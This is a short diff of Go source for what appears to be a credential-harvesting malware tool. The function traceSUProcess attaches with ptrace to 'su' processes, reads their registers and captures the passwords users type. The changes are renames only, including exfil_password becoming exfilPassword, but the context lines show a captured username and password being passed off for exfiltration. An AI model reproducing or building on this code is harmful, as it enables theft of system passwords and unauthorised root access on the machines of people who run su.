@@ -33,8 +33,8 @@ func traceSUProcess(pid int) {
 		}
 
 		var regs syscall.PtraceRegs
-		ptrace_err := syscall.PtraceGetRegs(pid, &regs)
-		if ptrace_err != nil {
+		err = syscall.PtraceGetRegs(pid, &regs)
+		if err != nil {
 			syscall.PtraceDetach(pid)
 			return
 		}
@@ -64,7 +64,7 @@ func traceSUProcess(pid int) {
 						}
 						return true
 					}(password) {
-						go exfil_password(username, password)
+						go exfilPassword(username, password)
 					}
 				}
 			}
